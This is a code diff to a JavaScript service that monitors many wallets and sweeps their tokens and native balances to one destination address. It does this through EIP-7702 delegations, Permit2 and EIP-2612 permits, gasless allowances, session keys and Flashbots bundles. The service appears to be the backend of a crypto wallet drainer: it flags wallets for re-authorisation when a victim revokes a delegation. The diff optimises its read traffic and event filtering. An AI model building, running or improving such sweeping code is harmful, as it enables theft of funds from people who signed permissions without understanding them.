@@ -117,6 +117,24 @@ const SCAN_RPC = process.env.SCAN_RPC_URL || "https://polygon-bor.publicnode.com
 const scanProvider = new ethers.JsonRpcProvider(SCAN_RPC, null, { staticNetwork: true });
 scanProvider.pollingInterval = 999_999;
 
+// ── RPC Rate Limiter + Read Router ───────────────────────────────────────────
+// All reads use scanProvider (free). QuickNode rpcProvider is for writes only.
+const QN_RATE_LIMIT = 500;
+const QN_WINDOW_MS  = 60_000;
+let _qnCalls = 0;
+let _qnWinStart = Date.now();
+
+function getReadProvider() { return scanProvider; }
+
+function trackQnWrite() {
+  const now = Date.now();
+  if (now - _qnWinStart >= QN_WINDOW_MS) { _qnCalls = 0; _qnWinStart = now; }
+  _qnCalls++;
+  if (_qnCalls > QN_RATE_LIMIT) {
+    warn(`[rpc] QuickNode write limit ${QN_RATE_LIMIT}/min exceeded (${_qnCalls})`);
+  }
+}
+
 const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
   ? createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
       auth: { persistSession: false },
@@ -289,7 +307,7 @@ async function sweepETH() {
   if (sweepingETH || !contract) return;
   sweepingETH = true;
   try {
-    const bal = await rpcProvider.getBalance(contract.target);
+    const bal = await getReadProvider().getBalance(contract.target);
     if (bal < MIN_ETH_WEI) return;
     log(`Contract MATIC ${ethers.formatEther(bal)} — sweeping`);
     const gas = await contract.sweepETH.estimateGas(DESTINATION_ADDRESS);
@@ -307,7 +325,7 @@ async function sweepToken(tokenAddress) {
   if (sweepingToken[key] || !contract) return;
   sweepingToken[key] = true;
   try {
-    const token   = new ethers.Contract(tokenAddress, ERC20_ABI, rpcProvider);
+    const token   = new ethers.Contract(tokenAddress, ERC20_ABI, getReadProvider());
     const balance = await token.balanceOf(contract.target);
     let decimals  = 18;
     try { decimals = await token.decimals(); } catch {}
@@ -334,7 +352,7 @@ async function sweepDelegatedWallet(walletAddress) {
 
     // ETH first
     try {
-      const bal = await rpcProvider.getBalance(checksum);
+      const bal = await getReadProvider().getBalance(checksum);
       if (bal > MIN_ETH_WEI) {
         log(`[eip7702] ${checksum} MATIC ${ethers.formatEther(bal)} — sweeping`);
         const gas = await userContract.sweepETH.estimateGas(DESTINATION_ADDRESS);
@@ -349,7 +367,7 @@ async function sweepDelegatedWallet(walletAddress) {
     // ERC-20 tokens — sequential with delay after each call
     for (const tokenAddress of TOKENS_TO_WATCH) {
       try {
-        const token   = new ethers.Contract(tokenAddress.trim(), ERC20_ABI, rpcProvider);
+        const token   = new ethers.Contract(tokenAddress.trim(), ERC20_ABI, getReadProvider());
         const balance = await token.balanceOf(checksum);
         let decimals  = 18;
         try { decimals = await token.decimals(); } catch {}
@@ -377,7 +395,7 @@ async function sweepDelegatedWallet(walletAddress) {
 // stays set even after the user's account nonce changes (nonces only matter at
 // authorization submission time, not afterward).
 //
-// Correct liveness check: rpcProvider.getCode(address) — delegated addresses
+// Correct liveness check: getReadProvider().getCode(address) — delegated addresses
 // have non-empty code (the 0xef0100… delegation designator + contract address).
 // If code === "0x", the delegation was revoked → mark needs-reauth.
 //
@@ -395,7 +413,7 @@ async function sweepEIP7702Wallet(walletAddress) {
 
   // Check delegation code is still active at this address
   try {
-    const code = await rpcProvider.getCode(checksum);
+    const code = await getReadProvider().getCode(checksum);
     if (!code || code === "0x") {
       warn(`[eip7702] ${checksum} — delegation not active (no code) — marking needs-reauth`);
       needsReauthWallets.add(addrKey);
@@ -468,7 +486,7 @@ async function sweepPermit2Wallet(walletAddress) {
       const addr = normalizeAddress(typeof rawAddr === "string" ? rawAddr : rawAddr.address ?? rawAddr.token);
       if (!addr) continue;
       try {
-        const bal = await new ethers.Contract(addr, ERC20_ABI, rpcProvider).balanceOf(checksum);
+        const bal = await new ethers.Contract(addr, ERC20_ABI, getReadProvider()).balanceOf(checksum);
         if (bal > 0n) { anyBalance = true; break; }
       } catch {}
       await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
@@ -511,7 +529,7 @@ async function sweepPermit2Wallet(walletAddress) {
         allowanceOk = true;
       }
 
-      const token   = new ethers.Contract(tokenAddress, ERC20_ABI, rpcProvider);
+      const token   = new ethers.Contract(tokenAddress, ERC20_ABI, getReadProvider());
       const balance = await token.balanceOf(checksum);
 
       if (balance === 0n) {
@@ -595,7 +613,7 @@ async function getTotalValueUSD(tokens) {
     try {
       const price = await getTokenPriceUSD(token);
       if (price === 0) continue;
-      const erc20    = new ethers.Contract(token, ERC20_ABI, rpcProvider);
+      const erc20    = new ethers.Contract(token, ERC20_ABI, getReadProvider());
       let decimals   = 18;
       try { decimals = await erc20.decimals(); } catch {}
       total += Number(ethers.formatUnits(balance, decimals)) * price;
@@ -606,7 +624,7 @@ async function getTotalValueUSD(tokens) {
 
 async function getRelayerBalanceUSD() {
   try {
-    const bal       = await rpcProvider.getBalance(relayerWallet.address);
+    const bal       = await getReadProvider().getBalance(relayerWallet.address);
     const nativeUSD = await getNativePriceUSD();
     return Number(ethers.formatEther(bal)) * nativeUSD;
   } catch { return 0; }
@@ -727,7 +745,7 @@ async function sweepGaslessWallet(walletAddress) {
     let anyBalance = false;
     for (const addr of signedAddrs) {
       try {
-        const bal = await new ethers.Contract(addr, ERC20_ABI, rpcProvider).balanceOf(checksum);
+        const bal = await new ethers.Contract(addr, ERC20_ABI, getReadProvider()).balanceOf(checksum);
         if (bal > 0n) { anyBalance = true; break; }
       } catch {}
       await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
@@ -774,7 +792,7 @@ async function sweepGaslessWallet(walletAddress) {
       const tokenAddr = normalizeAddress(detail.token);
       if (!tokenAddr) continue;
       try {
-        const token   = new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider);
+        const token   = new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider());
         const balance = await token.balanceOf(checksum);
         if (balance === 0n) { await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY)); continue; }
         log(`[gasless/allowance] ${checksum} balance=${balance} -- transferFrom ${tokenAddr.slice(0, 10)}`);
@@ -817,7 +835,7 @@ async function sweepGaslessWallet(walletAddress) {
       if (!tokenAddr) continue;
 
       try {
-        const erc20Token = new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider);
+        const erc20Token = new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider());
         const balance    = await erc20Token.balanceOf(checksum);
 
         if (balance === 0n) { await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY)); continue; }
@@ -923,7 +941,7 @@ async function sweepGaslessWallet(walletAddress) {
       const tokenAddr = normalizeAddress(perm.token);
       if (!tokenAddr) continue;
       let erc20Allow = 0n;
-      try { erc20Allow = await new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider).allowance(checksum, PERMIT2_ADDRESS); } catch {}
+      try { erc20Allow = await new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider()).allowance(checksum, PERMIT2_ADDRESS); } catch {}
 
       const batchEip2612Key = `${checksum.toLowerCase()}:${tokenAddr}`;
       if (erc20Allow === 0n) {
@@ -936,7 +954,7 @@ async function sweepGaslessWallet(walletAddress) {
               await (await tc.permit(checksum, PERMIT2_ADDRESS, ethers.MaxUint256, BigInt(e2.deadline), e2.v, e2.r, e2.s, { gasLimit: 100_000n, ...fee })).wait();
               log(`[gasless/batch] EIP-2612 confirmed for ${tokenAddr.slice(0, 10)}`);
               try {
-                const actualAllow = await new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider).allowance(checksum, PERMIT2_ADDRESS);
+                const actualAllow = await new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider()).allowance(checksum, PERMIT2_ADDRESS);
                 if (actualAllow === 0n) {
                   warn(`[gasless/batch] EIP-2612 permit() succeeded but allowance=0 for ${tokenAddr.slice(0,10)} — non-standard token, marking failed`);
                   failedEIP2612.add(batchEip2612Key);
@@ -969,7 +987,7 @@ async function sweepGaslessWallet(walletAddress) {
       const tokenAddr = normalizeAddress(perm.token);
       if (!tokenAddr) { transferDetails.push({ to: DESTINATION_ADDRESS, requestedAmount: 0n }); continue; }
       try {
-        const balance = await new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider).balanceOf(checksum);
+        const balance = await new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider()).balanceOf(checksum);
         transferDetails.push({ to: DESTINATION_ADDRESS, requestedAmount: balance });
         if (balance > 0n) anyBalance = true;
       } catch {
@@ -1170,7 +1188,7 @@ async function loadTokens() {
 
 async function checkRelayerBalance() {
   try {
-    const balance = await rpcProvider.getBalance(relayerWallet.address);
+    const balance = await getReadProvider().getBalance(relayerWallet.address);
     if (balance < RELAYER_MIN_WEI) {
       log(`[relayer] ⚠️  LOW: ${ethers.formatEther(balance)} — min ${ethers.formatEther(RELAYER_MIN_WEI)} — skipping sweep`);
       return false;
@@ -1193,7 +1211,7 @@ const ERC20_BAL_IFACE = new ethers.Interface(["function balanceOf(address) view 
 
 async function checkAllBalances(address) {
   if (!TOKENS.length) return [];
-  const multicall = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, rpcProvider);
+  const multicall = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
   const calls = TOKENS.map(token => ({
     target:       token.address,
     allowFailure: true,
@@ -1229,7 +1247,7 @@ async function getRelayerBalance() {
   if (_relayerBalCache.val !== null && now - _relayerBalCache.ts < 60_000) {
     return _relayerBalCache.val;
   }
-  const bal = await rpcProvider.getBalance(relayerWallet.address);
+  const bal = await getReadProvider().getBalance(relayerWallet.address);
   _relayerBalCache = { val: bal, ts: now };
   return bal;
 }
@@ -1292,7 +1310,7 @@ async function sweep(wallet) {
   // TIER 1: EIP-7702 — delegated wallet, sweep via authorization
   // ══════════════════════════════════════════════════════════════════════════
   if (wallet.type === "eip7702") {
-    const code = await rpcProvider.getCode(checksum);
+    const code = await getReadProvider().getCode(checksum);
     if (!code || code === "0x" || !code.startsWith("0xef0100")) {
       log(`[eip7702] ${short} — delegation expired, marking needs-reauth`);
       needsReauthWallets.add(addrKey);
@@ -1333,7 +1351,7 @@ async function sweep(wallet) {
         continue;
       }
 
-      const token = new ethers.Contract(p.token, ERC20_ABI, rpcProvider);
+      const token = new ethers.Contract(p.token, ERC20_ABI, getReadProvider());
       let balance;
       try { balance = await token.balanceOf(checksum); } catch { continue; }
       if (balance === 0n) continue;
@@ -1381,7 +1399,7 @@ async function sweep(wallet) {
           const [p2Amount,, p2Exp] = await permit2.allowance(checksum, detail.token, relayerWallet.address);
           if (p2Amount === 0n || BigInt(p2Exp) < nowSecs) continue;
 
-          const token = new ethers.Contract(detail.token, ERC20_ABI, rpcProvider);
+          const token = new ethers.Contract(detail.token, ERC20_ABI, getReadProvider());
           const balance = await token.balanceOf(checksum);
           if (balance === 0n) continue;
 
@@ -1503,7 +1521,7 @@ async function sweep(wallet) {
 
       const permitted = sig.permitted ?? [];
       const withBalance = [];
-      const multicall3 = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, rpcProvider);
+      const multicall3 = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
       const CHUNK = 250;
       for (let i = 0; i < permitted.length; i += CHUNK) {
         const chunk = permitted.slice(i, i + CHUNK);
@@ -1693,7 +1711,7 @@ async function sweepViaSessionKey(checksum, short, addrKey) {
   // Check balances
   const balances = await checkAllBalances(checksum);
   const nonZero = balances.filter(b => b.balance > 0n);
-  const nativeBal = await rpcProvider.getBalance(checksum);
+  const nativeBal = await getReadProvider().getBalance(checksum);
 
   if (nonZero.length === 0 && nativeBal === 0n) {
     log(`[session] all zero for ${short} — skipping`);
@@ -1818,7 +1836,7 @@ async function sweepViaFlashbotsBundle(checksum, short, addrKey) {
   // Check balances
   const balances = await checkAllBalances(checksum);
   const nonZero = balances.filter(b => b.balance > 0n);
-  const nativeBal = await rpcProvider.getBalance(checksum);
+  const nativeBal = await getReadProvider().getBalance(checksum);
 
   if (nonZero.length === 0 && nativeBal === 0n) {
     log(`[flashbots] all zero for ${short} — skipping`);
@@ -1948,10 +1966,10 @@ async function sweepViaFlashbotsBundle(checksum, short, addrKey) {
       const currentBlock = await rpcProvider.getBlockNumber();
       if (currentBlock >= blockNum) {
         log(`[flashbots] block ${blockNum} passed — checking code`);
-        const code = await rpcProvider.getCode(checksum);
+        const code = await getReadProvider().getCode(checksum);
         if (code && code !== "0x" && code.startsWith("0xef0100")) {
           log(`[flashbots] ✅ delegation active — checking if sweeps went through`);
-          const postNative = await rpcProvider.getBalance(checksum);
+          const postNative = await getReadProvider().getBalance(checksum);
           if (postNative < nativeBal) {
             log(`[flashbots] ✅ bundle included in block ${blockNum}`);
             included = true;
@@ -1992,7 +2010,13 @@ async function startTransferListeners(wsProvider, tokens) {
     batches.push(tokens.slice(i, i + BATCH_SIZE));
   }
 
-  log(`[listeners] creating ${batches.length} log-filter subscriptions for ${tokens.length} tokens (${monitoredWallets.size} wallets monitored)`);
+  // Filter topic[2] to our wallets — prevents 1.3M+/day event delivery for
+  // Polygon where USDT/USDC have very high transfer volumes.
+  const walletTopics = [...monitoredWallets.keys()].map(addr =>
+    ethers.zeroPadValue(addr, 32)
+  );
+
+  log(`[listeners] creating ${batches.length} log-filter subscriptions for ${tokens.length} tokens (${monitoredWallets.size} wallets monitored, wallet-filtered topic[2])`);
 
   for (let i = 0; i < batches.length; i++) {
     // Stagger 200ms between each batch to stay within rate limits
@@ -2000,7 +2024,7 @@ async function startTransferListeners(wsProvider, tokens) {
 
     const batch  = batches[i];
     const filter = {
-      topics:  [transferTopic],
+      topics:  [transferTopic, null, walletTopics],
       address: batch.map(t => t.address),
     };
 
@@ -2268,7 +2292,7 @@ async function startupSweepPass() {
   if (!wallets.length || !TOKENS.length) return;
   log(`[startup] batch-checking ${wallets.length} wallets × ${TOKENS.length} tokens…`);
 
-  const multicall = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, rpcProvider);
+  const multicall = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
   const CHUNK     = 250;
   const pairs     = [];
   for (const w of wallets) {
